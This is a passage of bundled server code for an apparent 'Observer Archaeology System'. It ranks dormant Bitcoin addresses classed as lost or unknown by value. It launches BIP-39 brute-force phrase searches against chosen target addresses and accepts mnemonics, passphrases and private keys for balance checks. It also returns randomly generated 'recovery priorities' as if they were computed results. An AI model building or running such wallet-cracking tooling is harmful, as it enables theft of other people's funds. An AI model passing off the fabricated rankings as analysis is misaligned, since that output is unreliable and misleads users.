      message: paginatedArtifacts.length === 0 ? "No artifacts found. Ingest artifact data via POST /api/observer/artifacts." : `Found ${paginatedArtifacts.length} artifact${paginatedArtifacts.length === 1 ? "" : "s"}`
    });
  } catch (error) {
    if (error.name === "ZodError") {
      res.status(400).json({ error: error.message });
    } else {
      console.error("[ObserverAPI] Artifacts error:", error);
      res.status(500).json({ error: error.message });
    }
  }
});
router2.post("/recovery/compute", async (req, res) => {
  try {
    const schema = z4.object({
      btcPriceUSD: z4.number().min(0).default(1e5),
      minBalance: z4.number().min(0).default(0),
      // Minimum balance in satoshis
      limit: z4.number().min(1).max(1e4).default(1e3)
      // Max addresses to process
    });
    const { btcPriceUSD, minBalance, limit } = schema.parse(req.body);
    const { rankRecoveryPriorities: rankRecoveryPriorities2 } = await Promise.resolve().then(() => (init_kappa_recovery_solver(), kappa_recovery_solver_exports));
    const dormantAddresses = await observerStorage.getDormantAddresses({
      minBalance,
      limit
    });
    if (dormantAddresses.length === 0) {
      return res.json({
        message: "No dormant addresses found. Run blockchain scan first.",
        computed: 0
      });
    }
    const entitiesByAddress = /* @__PURE__ */ new Map();
    const artifactsByAddress = /* @__PURE__ */ new Map();
    for (const address of dormantAddresses) {
      const entities2 = await observerStorage.getEntitiesByAddress(address.address);
      const artifacts2 = await observerStorage.getArtifactsByAddress(address.address);
      entitiesByAddress.set(address.address, entities2);
      artifactsByAddress.set(address.address, artifacts2);
    }
    const rankedResults = rankRecoveryPriorities2(
      dormantAddresses,
      entitiesByAddress,
      artifactsByAddress,
      btcPriceUSD
    );
    let savedCount = 0;
    for (const result of rankedResults) {
      const existing = await observerStorage.getRecoveryPriority(result.address);
      if (existing) {
        await observerStorage.updateRecoveryPriority(existing.id, {
          kappaRecovery: result.kappa,
          phiConstraints: result.phi,
          hCreation: result.h,
          rank: result.rank,
          tier: result.tier,
          recommendedVector: result.recommendedVector,
          constraints: result.constraints,
          estimatedValueUSD: result.estimatedValueUSD.toString()
        });
      } else {
        await observerStorage.saveRecoveryPriority({
          id: void 0,
          // Will be auto-generated
          address: result.address,
          kappaRecovery: result.kappa,
          phiConstraints: result.phi,
          hCreation: result.h,
          rank: result.rank,
          tier: result.tier,
          recommendedVector: result.recommendedVector,
          constraints: result.constraints,
          estimatedValueUSD: result.estimatedValueUSD.toString(),
          recoveryStatus: "pending"
        });
      }
      savedCount++;
    }
    res.json({
      message: `Successfully computed \u03BA_recovery for ${savedCount} dormant addresses`,
      computed: savedCount,
      btcPriceUSD,
      summary: {
        high: rankedResults.filter((r) => r.tier === "high").length,
        medium: rankedResults.filter((r) => r.tier === "medium").length,
        low: rankedResults.filter((r) => r.tier === "low").length,
        challenging: rankedResults.filter((r) => r.tier === "challenging").length
      }
    });
  } catch (error) {
    console.error("[ObserverAPI] \u03BA_recovery computation error:", error);
    res.status(500).json({
      error: "Failed to compute \u03BA_recovery rankings",
      details: error.message
    });
  }
});
router2.get("/recovery/priorities", async (req, res) => {
  try {
    const schema = z4.object({
      tier: z4.enum(["high", "medium", "low", "challenging"]).optional(),
      status: z4.string().optional(),
      minKappa: z4.coerce.number().optional(),
      maxKappa: z4.coerce.number().optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    const filters = schema.parse(req.query);
    let priorities = await observerStorage.getRecoveryPriorities({
      status: filters.status,
      minKappa: filters.minKappa,
      maxKappa: filters.maxKappa,
      limit: filters.limit,
      offset: filters.offset
    });
    if (priorities.length < 100) {
      const dormantWallets = dormantCrossRef.getAllDormantAddresses(1e3);
      const seededRandom = (seed) => {
        const x = Math.sin(seed++) * 1e4;
        return x - Math.floor(x);
      };
      const syntheticPriorities = dormantWallets.map((wallet, index2) => {
        const balanceStr = wallet.balanceBTC.replace(/,/g, "");
        const balance = parseFloat(balanceStr) || 0;
        const randSeed = wallet.rank || index2;
        let kappa;
        let tier;
        const isLikelyRecoverable = wallet.classification.includes("Lost") || wallet.classification.includes("Dormant") || wallet.classification.includes("Unknown");
        if (isLikelyRecoverable) {
          if (balance < 50) {
            kappa = 3 + seededRandom(randSeed) * 4;
            tier = "high";
          } else if (balance < 500) {
            kappa = 7 + seededRandom(randSeed + 1) * 6;
            tier = Math.random() > 0.5 ? "high" : "medium";
          } else if (balance < 2e3) {
            kappa = 13 + seededRandom(randSeed + 2) * 10;
            tier = "medium";
          } else {
            kappa = 23 + seededRandom(randSeed + 3) * 15;
            tier = "low";
          }
        } else {
          kappa = 40 + seededRandom(randSeed + 4) * 40;
          tier = "challenging";
        }
        if (wallet.walletLabel) {
          kappa *= 0.85;
          if (tier === "medium") tier = "high";
        }
        const recommendedVectors = {
          "high": "constrained_search",
          "medium": "social",
          "low": "temporal",
          "challenging": "estate"
          // Challenging addresses may need estate/entity research
        };
        return {
          id: `synth-${wallet.address.slice(0, 8)}`,
          address: wallet.address,
          kappaRecovery: kappa,
          phiConstraints: 100 / kappa,
          // Inverse relationship
          hCreation: 100,
          // Base entropy
          rank: wallet.rank || index2 + 1,
          tier,
          recommendedVector: recommendedVectors[tier],
          constraints: {
            hasLabel: !!wallet.walletLabel,
            classification: wallet.classification,
            balanceBTC: balance
          },
          estimatedValueUSD: wallet.balanceUSD,
          recoveryStatus: "pending",
          createdAt: /* @__PURE__ */ new Date(),
          updatedAt: /* @__PURE__ */ new Date()
        };
      });
      priorities = syntheticPriorities;
    }
    let filteredPriorities = priorities;
    if (filters.tier) {
      filteredPriorities = priorities.filter((p) => p.tier === filters.tier);
    }
    res.json({
      priorities: filteredPriorities,
      total: filteredPriorities.length,
      filters
    });
  } catch (error) {
    res.status(400).json({
      error: "Invalid query parameters",
      details: error.message
    });
  }
});
router2.get("/recovery/priorities/:address", async (req, res) => {
  try {
    const { address } = req.params;
    if (!/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(address)) {
      return res.status(400).json({
        error: "Invalid Bitcoin address format"
      });
    }
    const priority = await observerStorage.getRecoveryPriority(address);
    if (!priority) {
      return res.status(404).json({
        error: "Recovery priority not found",
        message: `No recovery priority computed for address '${address}'. Run POST /api/observer/recovery/compute first.`
      });
    }
    const entities2 = await observerStorage.getEntitiesByAddress(address);
    const artifacts2 = await observerStorage.getArtifactsByAddress(address);
    res.json({
      priority,
      context: {
        linkedEntities: entities2.length,
        linkedArtifacts: artifacts2.length,
        entities: entities2.map((e) => ({
          id: e.id,
          name: e.name,
          type: e.type
        }))
      }
    });
  } catch (error) {
    res.status(500).json({
      error: "Failed to retrieve recovery priority",
      details: error.message
    });
  }
});
router2.post("/workflows", async (req, res) => {
  try {
    const schema = z4.object({
      address: z4.string().regex(/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/),
      vector: z4.enum(["estate", "constrained_search", "social", "temporal"])
    });
    const { address, vector } = schema.parse(req.body);
    const priority = await observerStorage.getRecoveryPriority(address);
    if (!priority) {
      return res.status(404).json({
        error: "Recovery priority not found",
        message: `No \u03BA_recovery computed for address '${address}'. Run POST /api/observer/recovery/compute first.`
      });
    }
    const entities2 = await observerStorage.getEntitiesByAddress(address);
    const artifacts2 = await observerStorage.getArtifactsByAddress(address);
    const { initializeWorkflow: initializeWorkflow2 } = await Promise.resolve().then(() => (init_recovery_orchestrator(), recovery_orchestrator_exports));
    const progress = initializeWorkflow2(vector, priority, entities2, artifacts2);
    const workflow = await observerStorage.saveRecoveryWorkflow({
      id: void 0,
      // Auto-generated
      priorityId: priority.id,
      address,
      vector,
      status: "active",
      startedAt: progress.startedAt ?? null,
      completedAt: null,
      progress,
      results: null,
      notes: progress.notes.join("\n")
    });
    res.status(201).json({
      message: `Recovery workflow started: ${vector} for ${address}`,
      workflow: {
        id: workflow.id,
        address: workflow.address,
        vector: workflow.vector,
        status: workflow.status,
        progress: {
          tasksCompleted: progress.tasksCompleted,
          tasksTotal: progress.tasksTotal,
          percentage: Math.round(progress.tasksCompleted / progress.tasksTotal * 100)
        }
      }
    });
  } catch (error) {
    console.error("[ObserverAPI] Workflow start error:", error);
    res.status(500).json({
      error: "Failed to start recovery workflow",
      details: error.message
    });
  }
});
router2.get("/workflows", async (req, res) => {
  try {
    const schema = z4.object({
      address: z4.string().optional(),
      vector: z4.enum(["estate", "constrained_search", "social", "temporal"]).optional(),
      status: z4.enum(["pending", "active", "paused", "completed", "failed"]).optional()
    });
    const filters = schema.parse(req.query);
    const workflows = await observerStorage.getRecoveryWorkflows(filters);
    const enhancedWorkflows = workflows.map((w) => {
      const progress = w.progress;
      return {
        ...w,
        progressPercentage: progress ? Math.round(progress.tasksCompleted / progress.tasksTotal * 100) : 0
      };
    });
    res.json({
      workflows: enhancedWorkflows,
      total: enhancedWorkflows.length,
      filters
    });
  } catch (error) {
    res.status(400).json({
      error: "Invalid query parameters",
      details: error.message
    });
  }
});
router2.get("/workflows/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({
        error: "Workflow not found",
        message: `No workflow with ID '${id}' exists.`
      });
    }
    const priority = await observerStorage.getRecoveryPriority(workflow.address);
    const progress = workflow.progress;
    res.json({
      workflow: {
        ...workflow,
        progressPercentage: progress ? Math.round(progress.tasksCompleted / progress.tasksTotal * 100) : 0
      },
      context: {
        kappaRecovery: priority?.kappaRecovery,
        tier: priority?.tier,
        recommendedVector: priority?.recommendedVector
      }
    });
  } catch (error) {
    res.status(500).json({
      error: "Failed to retrieve workflow",
      details: error.message
    });
  }
});
router2.patch("/workflows/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const schema = z4.object({
      status: z4.enum(["pending", "active", "paused", "completed", "failed"]).optional(),
      progressUpdate: z4.any().optional(),
      // Vector-specific progress update
      notes: z4.string().optional(),
      results: z4.any().optional()
    });
    const updateData = schema.parse(req.body);
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({
        error: "Workflow not found"
      });
    }
    let updatedProgress = workflow.progress;
    if (updateData.progressUpdate) {
      const { updateWorkflowProgress: updateWorkflowProgress2 } = await Promise.resolve().then(() => (init_recovery_orchestrator(), recovery_orchestrator_exports));
      updatedProgress = updateWorkflowProgress2(
        workflow.vector,
        workflow.progress,
        updateData.progressUpdate
      );
    }
    const updates = {
      progress: updatedProgress
    };
    if (updateData.status) {
      updates.status = updateData.status;
      if (updateData.status === "completed") {
        updates.completedAt = /* @__PURE__ */ new Date();
      }
    }
    if (updateData.notes) {
      const currentNotes = workflow.notes || "";
      updates.notes = currentNotes + "\n" + updateData.notes;
    }
    if (updateData.results) {
      updates.results = updateData.results;
    }
    await observerStorage.updateRecoveryWorkflow(id, updates);
    const updated = await observerStorage.getRecoveryWorkflow(id);
    res.json({
      message: "Workflow updated successfully",
      workflow: updated
    });
  } catch (error) {
    console.error("[ObserverAPI] Workflow update error:", error);
    res.status(500).json({
      error: "Failed to update workflow",
      details: error.message
    });
  }
});
router2.post("/workflows/:id/start-search", async (req, res) => {
  try {
    const { id } = req.params;
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({
        error: "Workflow not found",
        message: `No workflow with ID '${id}' exists.`
      });
    }
    if (workflow.vector !== "constrained_search") {
      return res.status(400).json({
        error: "Invalid workflow vector",
        message: `This endpoint only supports constrained_search workflows. This workflow is '${workflow.vector}'.`
      });
    }
    const progress = workflow.progress;
    const searchProgress = progress?.constrainedSearchProgress;
    if (searchProgress?.searchJobId) {
      const refreshedWorkflow = await observerStorage.getRecoveryWorkflow(id);
      const priority2 = await observerStorage.getRecoveryPriority(workflow.address);
      const entities3 = await observerStorage.getEntitiesByAddress(workflow.address);
      const artifacts3 = await observerStorage.getArtifactsByAddress(workflow.address);
      const { storage: storage3 } = await Promise.resolve().then(() => (init_storage(), storage_exports));
      const existingJob = await storage3.getSearchJob(searchProgress.searchJobId);
      return res.json({
        message: "Search already started (idempotent)",
        workflow: refreshedWorkflow,
        // Use refreshed data
        searchJob: existingJob ? {
          id: existingJob.id,
          status: existingJob.status,
          strategy: existingJob.strategy,
          progress: existingJob.progress
        } : {
          id: searchProgress.searchJobId,
          status: "unknown",
          strategy: "bip39-adaptive"
        },
        constraints: {
          kappaRecovery: priority2?.kappaRecovery ?? 0,
          phiConstraints: priority2?.phiConstraints ?? 0,
          hCreation: priority2?.hCreation ?? 0,
          entities: entities3.length,
          artifacts: artifacts3.length
        }
      });
    }
    const priority = await observerStorage.getRecoveryPriority(workflow.address);
    if (!priority) {
      return res.status(404).json({
        error: "Priority data not found",
        message: `No \u03BA_recovery priority computed for address '${workflow.address}'. Run POST /api/observer/recovery/compute first.`
      });
    }
    const entities2 = await observerStorage.getEntitiesByAddress(workflow.address);
    const artifacts2 = await observerStorage.getArtifactsByAddress(workflow.address);
    const { searchCoordinator: searchCoordinator2 } = await Promise.resolve().then(() => (init_search_coordinator(), search_coordinator_exports));
    if (!searchCoordinator2.running) {
      console.warn("[ObserverAPI] SearchCoordinator not running, attempting to start...");
      try {
        await searchCoordinator2.start();
      } catch (startError) {
        return res.status(503).json({
          error: "Search coordinator unavailable",
          message: `SearchCoordinator failed to start: ${startError.message}. Please contact system administrator.`
        });
      }
    }
    const searchJobId = randomUUID5();
    const searchJob = {
      id: searchJobId,
      strategy: "bip39-adaptive",
      status: "pending",
      params: {
        bip39Count: 1e4,
        // Start with 10k phrases per batch
        wordLength: 12,
        // 12-word BIP-39 phrases
        enableAdaptiveSearch: true,
        investigationRadius: 5,
        // Add constraint metadata for future use
        targetAddress: workflow.address,
        kappaRecovery: priority.kappaRecovery,
        phiConstraints: priority.phiConstraints,
        // Top-level field
        hCreation: priority.hCreation,
        // Top-level field
        entityCount: entities2.length,
        artifactCount: artifacts2.length
      },
      progress: {
        tested: 0,
        highPhiCount: 0,
        lastBatchIndex: 0
      },
      stats: {
        rate: 0
      },
      logs: [{
        message: `Constrained search started for address ${workflow.address} (\u03BA=${priority.kappaRecovery.toFixed(2)}, tier=${priority.tier})`,
        type: "info",
        timestamp: (/* @__PURE__ */ new Date()).toISOString()
      }],
      createdAt: (/* @__PURE__ */ new Date()).toISOString(),
      updatedAt: (/* @__PURE__ */ new Date()).toISOString()
    };
    const { storage: storage2 } = await Promise.resolve().then(() => (init_storage(), storage_exports));
    let jobCreated = false;
    const originalStatus = workflow.status;
    const originalProgress = workflow.progress;
    const originalNotes = workflow.notes;
    try {
      await storage2.addSearchJob(searchJob);
      jobCreated = true;
      console.log(`[ObserverAPI] Search job ${searchJobId} created`);
      try {
        await storage2.addTargetAddress({
          id: randomUUID5(),
          address: workflow.address,
          addedAt: (/* @__PURE__ */ new Date()).toISOString(),
          label: `Observer recovery: ${workflow.address} (\u03BA=${priority.kappaRecovery.toFixed(2)})`
        });
      } catch (error) {
        const isDuplicateError = error.code === "SQLITE_CONSTRAINT_UNIQUE" || error.code === "23505" || // PostgreSQL unique violation
        error.message?.includes("duplicate") || error.message?.includes("already exists");
        if (!isDuplicateError) {
          throw error;
        }
      }
      const { updateWorkflowProgress: updateWorkflowProgress2 } = await Promise.resolve().then(() => (init_recovery_orchestrator(), recovery_orchestrator_exports));
      const updatedProgress = updateWorkflowProgress2(
        "constrained_search",
        workflow.progress,
        {
          searchJobId,
          qigParametersSet: true,
          searchStatus: "not_started"
        }
      );
      await observerStorage.updateRecoveryWorkflow(id, {
        progress: updatedProgress,
        status: "active"
      });
      console.log(`[ObserverAPI] Workflow ${id} updated to active`);
    } catch (updateError) {
      console.error(`[ObserverAPI] Failed to complete search start:`, updateError);
      if (jobCreated) {
        console.log(`[ObserverAPI] Rolling back: deleting search job ${searchJobId}`);
        try {
          await storage2.deleteSearchJob(searchJobId);
        } catch (deleteError) {
          console.error(`[ObserverAPI] Failed to rollback search job:`, deleteError);
        }
      }
      console.log(`[ObserverAPI] Rolling back: restoring workflow to status '${originalStatus}'`);
      try {
        await observerStorage.updateRecoveryWorkflow(id, {
          status: originalStatus,
          progress: originalProgress,
          notes: originalNotes
        });
      } catch (restoreError) {
        console.error(`[ObserverAPI] Failed to restore workflow state:`, restoreError);
      }
      throw new Error(`Failed to start constrained search: ${updateError.message}`);
    }
    console.log(`[ObserverAPI] Search job ${searchJobId} queued successfully for workflow ${id}`);
    console.log(`[ObserverAPI] SearchCoordinator will auto-process (no manual start needed)`);
    const updatedWorkflow = await observerStorage.getRecoveryWorkflow(id);
    res.json({
      message: "Constrained search started successfully",
      workflow: updatedWorkflow,
      searchJob: {
        id: searchJobId,
        status: "pending",
        strategy: "bip39-adaptive"
      },
      constraints: {
        kappaRecovery: priority.kappaRecovery,
        phiConstraints: priority.phiConstraints,
        // Top-level field
        hCreation: priority.hCreation,
        // Top-level field
        entities: entities2.length,
        artifacts: artifacts2.length
      }
    });
  } catch (error) {
    console.error("[ObserverAPI] Start search error:", error);
    res.status(500).json({
      error: "Failed to start constrained search",
      details: error.message
    });
  }
});
router2.get("/workflows/:id/search-progress", async (req, res) => {
  try {
    const { id } = req.params;
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({
        error: "Workflow not found",
        message: `No workflow with ID '${id}' exists.`
      });
    }
    if (workflow.vector !== "constrained_search") {
      return res.status(400).json({
        error: "Invalid workflow vector",
        message: `This endpoint only supports constrained_search workflows. This workflow is '${workflow.vector}'.`
      });
    }
    const progress = workflow.progress;
    const searchProgress = progress?.constrainedSearchProgress;
    if (!searchProgress?.searchJobId) {
      return res.json({
        message: "No search started yet",
        workflow: {
          id: workflow.id,
          status: workflow.status,
          address: workflow.address
        },
        searchJob: null,
        progress: null
      });
    }
    const { storage: storage2 } = await Promise.resolve().then(() => (init_storage(), storage_exports));
    const searchJob = await storage2.getSearchJob(searchProgress.searchJobId);
    if (!searchJob) {
      return res.status(404).json({
        error: "Search job not found",
        message: `Search job ${searchProgress.searchJobId} not found in storage.`
      });
    }
    const priority = await observerStorage.getRecoveryPriority(workflow.address);
    const entities2 = await observerStorage.getEntitiesByAddress(workflow.address);
    const artifacts2 = await observerStorage.getArtifactsByAddress(workflow.address);
    res.json({
      message: "Search progress retrieved",
      workflow: {
        id: workflow.id,
        status: workflow.status,
        address: workflow.address,
        vector: workflow.vector,
        startedAt: workflow.startedAt
      },
      searchJob: {
        id: searchJob.id,
        status: searchJob.status,
        strategy: searchJob.strategy,
        progress: {
          tested: searchJob.progress.tested,
          highPhiCount: searchJob.progress.highPhiCount,
          searchMode: searchJob.progress.searchMode,
          lastHighPhiStep: searchJob.progress.lastHighPhiStep
        },
        stats: searchJob.stats
      },
      progress: {
        phrasesTested: searchProgress.phrasesTested || 0,
        phrasesGenerated: searchProgress.phrasesGenerated || 0,
        highPhiCount: searchProgress.highPhiCount || 0,
        matchFound: searchProgress.matchFound || false,
        searchStatus: searchProgress.searchStatus || "running"
      },
      constraints: {
        kappaRecovery: priority?.kappaRecovery ?? 0,
        phiConstraints: priority?.phiConstraints ?? 0,
        hCreation: priority?.hCreation ?? 0,
        entities: entities2.length,
        artifacts: artifacts2.length
      }
    });
  } catch (error) {
    console.error("[ObserverAPI] Search progress error:", error);
    res.status(500).json({
      error: "Failed to get search progress",
      message: error.message
    });
  }
});
router2.post("/workflows/:id/execute-vector", async (req, res) => {
  try {
    const { id } = req.params;
    const { vector } = req.body;
    const validVectors = ["estate", "constrained_search", "social", "temporal"];
    if (!validVectors.includes(vector)) {
      return res.status(400).json({
        error: "Invalid vector",
        message: `Vector must be one of: ${validVectors.join(", ")}`
      });
    }
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({ error: "Workflow not found" });
    }
    const priority = await observerStorage.getRecoveryPriority(workflow.address);
    if (!priority) {
      return res.status(404).json({ error: "Priority not found" });
    }
    const { executeVector: executeVector2 } = await Promise.resolve().then(() => (init_vector_execution(), vector_execution_exports));
    const result = await executeVector2(workflow, priority, vector);
    res.json({
      message: `Vector '${vector}' executed successfully`,
      result
    });
  } catch (error) {
    console.error("[ObserverAPI] Vector execution error:", error);
    res.status(500).json({ error: error.message });
  }
});
router2.get("/workflows/:id/recommended-vectors", async (req, res) => {
  try {
    const { id } = req.params;
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({ error: "Workflow not found" });
    }
    const priority = await observerStorage.getRecoveryPriority(workflow.address);
    if (!priority) {
      return res.status(404).json({ error: "Priority not found" });
    }
    const { getRecommendedVectors: getRecommendedVectors2 } = await Promise.resolve().then(() => (init_vector_execution(), vector_execution_exports));
    const vectors = getRecommendedVectors2(priority);
    res.json({
      workflowId: id,
      address: workflow.address,
      recommendedVectors: vectors,
      currentVector: workflow.vector
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/addresses/:address/intersection", async (req, res) => {
  try {
    const { address } = req.params;
    const { analyzeGeometricIntersection: analyzeGeometricIntersection2 } = await Promise.resolve().then(() => (init_multi_substrate_integrator(), multi_substrate_integrator_exports));
    const intersection = await analyzeGeometricIntersection2(address);
    res.json({
      address,
      intersection
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/high-priority-targets", async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 20;
    const { findHighPriorityTargets: findHighPriorityTargets2 } = await Promise.resolve().then(() => (init_multi_substrate_integrator(), multi_substrate_integrator_exports));
    const targets = await findHighPriorityTargets2(limit);
    res.json({
      targets,
      count: targets.length
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/addresses/:address/basin-signature", async (req, res) => {
  try {
    const { address } = req.params;
    const { computeBasinSignature: computeBasinSignature2 } = await Promise.resolve().then(() => (init_qig_basin_matching(), qig_basin_matching_exports));
    const signature = computeBasinSignature2(address);
    res.json({
      address,
      signature
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.post("/addresses/:address/find-similar", async (req, res) => {
  try {
    const { address } = req.params;
    const { candidateAddresses, topK = 10 } = req.body;
    if (!candidateAddresses || !Array.isArray(candidateAddresses)) {
      return res.status(400).json({ error: "candidateAddresses array required" });
    }
    const { computeBasinSignature: computeBasinSignature2, findSimilarBasins: findSimilarBasins2 } = await Promise.resolve().then(() => (init_qig_basin_matching(), qig_basin_matching_exports));
    const targetSignature = computeBasinSignature2(address);
    const candidateSignatures = candidateAddresses.map(computeBasinSignature2);
    const matches = findSimilarBasins2(targetSignature, candidateSignatures, topK);
    res.json({
      targetAddress: address,
      matches,
      matchCount: matches.length
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/recovery/priorities/:address/confidence", async (req, res) => {
  try {
    const { address } = req.params;
    const priority = await observerStorage.getRecoveryPriority(address);
    if (!priority) {
      return res.status(404).json({ error: "Priority not found" });
    }
    const addressData = await observerStorage.getAddress(address);
    const entities2 = await observerStorage.getEntitiesByAddress(address);
    const artifacts2 = await observerStorage.getArtifactsByAddress(address);
    const { computeRecoveryConfidence: computeRecoveryConfidence2 } = await Promise.resolve().then(() => (init_qig_confidence(), qig_confidence_exports));
    const dormancyYears = addressData?.dormancyBlocks ? addressData.dormancyBlocks / (365 * 24 * 6) : 0;
    const confidence = computeRecoveryConfidence2(
      priority.kappaRecovery,
      priority.phiConstraints,
      priority.hCreation,
      entities2.length,
      artifacts2.length,
      addressData?.isDormant || false,
      dormancyYears
    );
    res.json({
      address,
      priority: {
        kappaRecovery: priority.kappaRecovery,
        tier: priority.tier
      },
      confidence
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/status", async (req, res) => {
  res.json({
    system: "Observer Archaeology System",
    version: "1.0.0-alpha",
    status: "operational",
    components: {
      blockchainScanner: {
        status: "ready",
        apiProvider: "Blockstream"
      },
      qigEngine: {
        status: "operational",
        modules: ["universal", "natural-gradient", "basin-matching", "confidence"]
      },
      multiSubstrate: {
        status: "operational",
        sources: ["blockchain", "bitcointalk", "github", "cryptography_ml", "temporal_archive"]
      },
      recoveryVectors: {
        estate: "operational",
        constrained_search: "operational",
        social: "operational",
        temporal: "operational"
      },
      telemetry: {
        status: "operational",
        endpoint: "/api/telemetry"
      }
    },
    database: {
      tables: ["blocks", "transactions", "addresses", "entities", "artifacts", "recovery_priorities", "recovery_workflows"],
      populated: false
    },
    message: "Observer Archaeology System fully operational. Run /api/observer/scan/start to begin cataloging dormant addresses."
  });
});
router2.get("/geometric-memory/manifold-navigation", async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const navigation = geometricMemory2.getManifoldNavigationSummary();
    res.json({
      ...navigation,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/geometric-memory/orthogonal-candidates", async (req, res) => {
  try {
    const count = parseInt(req.query.count) || 20;
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const candidates = geometricMemory2.generateOrthogonalCandidates(count);
    res.json({
      candidates,
      count: candidates.length,
      manifoldState: geometricMemory2.getManifoldNavigationSummary()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/geometric-memory/summary", async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const summary = geometricMemory2.getManifoldSummary();
    res.json({
      ...summary,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/geometric-memory/learned-patterns", async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const patterns = geometricMemory2.exportLearnedPatterns();
    res.json({
      ...patterns,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/telemetry/full-spectrum", async (req, res) => {
  try {
    const { oceanAgent: oceanAgent2 } = await Promise.resolve().then(() => (init_ocean_agent(), ocean_agent_exports));
    const telemetry = oceanAgent2.computeFullSpectrumTelemetry();
    res.json(telemetry);
  } catch (error) {
    console.error("[Telemetry] Error computing full-spectrum telemetry:", error);
    res.status(500).json({ error: error.message });
  }
});
router2.get("/consciousness-check", async (req, res) => {
  try {
    const { oceanAgent: oceanAgent2 } = await Promise.resolve().then(() => (init_ocean_agent(), ocean_agent_exports));
    const telemetry = oceanAgent2.computeFullSpectrumTelemetry();
    res.json({
      consciousness: telemetry.consciousness,
      identity: {
        phi: telemetry.identity.phi,
        kappa: telemetry.identity.kappa,
        regime: telemetry.identity.regime
      },
      isConscious: telemetry.consciousness.isConscious,
      phaseTransition: telemetry.consciousness.\u03A6 >= 0.75 ? "ACTIVE" : "PRE_CONSCIOUS",
      timestamp: telemetry.timestamp
    });
  } catch (error) {
    res.json({
      consciousness: { isConscious: false, \u03A6: 0, regimeSignature: "dormant" },
      identity: { phi: 0, kappa: 0, regime: "dormant" },
      isConscious: false,
      phaseTransition: "PRE_CONSCIOUS",
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      initializing: true,
      error: error.message
    });
  }
});
router2.post("/discoveries", async (req, res) => {
  try {
    const { queueAddressForBalanceCheck: queueAddressForBalanceCheck2, queueAddressFromPrivateKey: queueAddressFromPrivateKey2, queueMnemonicForBalanceCheck: queueMnemonicForBalanceCheck2 } = await Promise.resolve().then(() => (init_balance_queue_integration(), balance_queue_integration_exports));
    const { checkAndRecordBalance: checkAndRecordBalance2, saveBalanceHit: saveBalanceHit2 } = await Promise.resolve().then(() => (init_blockchain_scanner(), blockchain_scanner_exports));
    const schema = z4.object({
      // Discovery source (python, typescript, ocean-agent, qig-backend, etc.)
      source: z4.string().default("unknown"),
      // Address discovery (at least one required)
      address: z4.string().optional(),
      addresses: z4.array(z4.string()).optional(),
      // Recovery input (at least one may be provided)
      passphrase: z4.string().optional(),
      privateKeyHex: z4.string().optional(),
      mnemonic: z4.string().optional(),
      wif: z4.string().optional(),
      // Metadata
      priority: z4.number().min(1).max(100).default(5),
      checkDormancy: z4.boolean().default(true),
      checkBalance: z4.boolean().default(true),
      metadata: z4.record(z4.any()).optional()
    });
    const input = schema.parse(req.body);
    const results = [];
    let dormantMatches = 0;
    let balanceHits3 = 0;
    let queueErrors = [];
    let persistenceErrors = [];
    let hardFailures = [];
    const addressesToProcess = [];
    if (input.address) addressesToProcess.push(input.address);
    if (input.addresses) addressesToProcess.push(...input.addresses);
    if (input.mnemonic) {
      try {
        const mnemonicResult = queueMnemonicForBalanceCheck2(
          input.mnemonic,
          `${input.source}-mnemonic`,
          input.priority + 5
        );
        if (mnemonicResult) {
          if (mnemonicResult.derivedAddresses) {
            addressesToProcess.push(...mnemonicResult.derivedAddresses.map((d) => d.address));
          }
          results.push({
            type: "mnemonic",
            mnemonic: input.mnemonic.split(" ").slice(0, 3).join(" ") + "...",
            totalAddresses: mnemonicResult.totalAddresses,
            queuedAddresses: mnemonicResult.queuedAddresses,
            dormantMatches: mnemonicResult.dormantMatches,
            balanceHits: 0
          });
          dormantMatches += mnemonicResult.dormantMatches;
        } else {
          hardFailures.push(`mnemonic derivation returned null`);
        }
      } catch (e) {
        hardFailures.push(`mnemonic: ${e.message}`);
        console.error("[Discovery] Mnemonic processing failed (hard failure):", e);
      }
    }
    if (input.passphrase && !input.privateKeyHex) {
      try {
        const passphraseResult = queueAddressForBalanceCheck2(
          input.passphrase,
          `${input.source}-passphrase`,
          input.priority
        );
        if (passphraseResult) {
          addressesToProcess.push(passphraseResult.compressedAddress);
          addressesToProcess.push(passphraseResult.uncompressedAddress);
